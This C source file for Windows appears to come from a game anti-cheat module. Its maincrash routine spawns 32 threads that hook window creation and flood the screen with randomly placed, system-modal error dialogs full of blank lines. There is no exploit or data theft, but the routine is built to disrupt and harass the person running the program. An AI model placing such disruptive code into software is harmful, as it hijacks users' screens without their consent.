
#include <stdio.h>
#include <windows.h>
#include <time.h>
#include <stdlib.h>
#include <windows.h>
#include <tchar.h>
#include <strsafe.h>
#include "Antihack.h"

DWORD WINAPI ripMessageThread( LPVOID );
LRESULT CALLBACK msgBoxHook( int, WPARAM, LPARAM );
extern int rrrr = 0;

LRESULT CALLBACK msgBoxHook( int nCode, WPARAM wParam, LPARAM lParam ) {
	if ( nCode == HCBT_CREATEWND ) {
		CREATESTRUCT *pcs = ( ( CBT_CREATEWND * )lParam )->lpcs;

		if ( ( pcs->style & WS_DLGFRAME ) || ( pcs->style & WS_POPUP ) ) {
			HWND hwnd = ( HWND )wParam;

			int x = rand( ) % ( GetSystemMetrics( SM_CXSCREEN ) - pcs->cx );
			int y = rand( ) % ( GetSystemMetrics( SM_CYSCREEN ) - pcs->cy );
			rrrr = rand( ) % 16384;
			pcs->x = x;
			pcs->y = y;
		}
	}

	return CallNextHookEx( 0, nCode, wParam, lParam );
}
void maincrash( ) {
	for ( int i = 0; i < 32; i++ ) {
		DWORD thread_id;
		HANDLE tmp = CreateThread( NULL, 0, &ripMessageThread, NULL, NULL, &thread_id );
		AddThreadInfoMy( thread_id, L" ripMessageThread THREAD" );

		Sleep( 75 );
		CloseHandle(tmp );
	}
}
DWORD WINAPI ripMessageThread( LPVOID parameter ) {
	HHOOK hook = SetWindowsHookEx( WH_CBT, msgBoxHook, 0, GetCurrentThreadId( ) );
	MessageBoxA( NULL, "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n",
		".", MB_OK | MB_SYSTEMMODAL | MB_ICONHAND );
	rrrr = rand( ) % 16384;
	UnhookWindowsHookEx( hook );
	return 0;
}